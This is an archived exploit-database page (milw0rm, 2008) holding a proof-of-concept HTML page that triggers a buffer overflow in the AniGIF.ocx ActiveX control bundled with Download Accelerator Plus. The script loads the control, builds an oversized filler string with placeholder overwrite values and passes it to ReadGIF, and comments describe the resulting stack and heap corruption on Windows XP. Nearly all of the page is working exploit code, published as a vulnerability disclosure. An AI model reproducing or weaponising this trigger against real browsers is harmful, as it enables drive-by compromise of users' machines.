<html><head><title>Download Accelerator Plus - DAP 8.6 (AniGIF.ocx) Buffer Overflow PoC</title></head><pre>&lt;html&gt;
&lt;body&gt;
&lt;object classid='clsid:82351441-9094-11D1-A24B-00A0C932C7DF' id='target' /&gt;
&lt;/object&gt;
&lt;script language=javascript&gt;

// anigif.ocx by www.jcomsoft.com can be found distribuited with some applications, 
// I found it in Download Accelerator Plus 6.8. 
// DAP comes with an old version, but the last from jcomsoft is also vulnerable:
// there's a stack-based buffer overflow in the ReadGIF and ReadGIF2 methods, 
// the funny thing is that after the first exception that will be handled by IE,
// when the object is released we reach RtlpCoalesceFreeBlocks owning eax and ecx 
// with windogs xp sp1 or the second check of safe-unlink with sp2 in a standard heap 
// overflow scenario.

var buf;
for (var i=0; i&lt;259; i++) buf += &quot;X&quot;;

buf +=&quot;BBBB&quot;;
buf += &quot;CCCC&quot;;

for (var i=0; i&lt;5728; i++) buf += &quot;H&quot;;

target.ReadGIF(buf);

window.location = &quot;http://www.google.com&quot;;

&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;

# milw0rm.com [2008-08-10]</pre></html>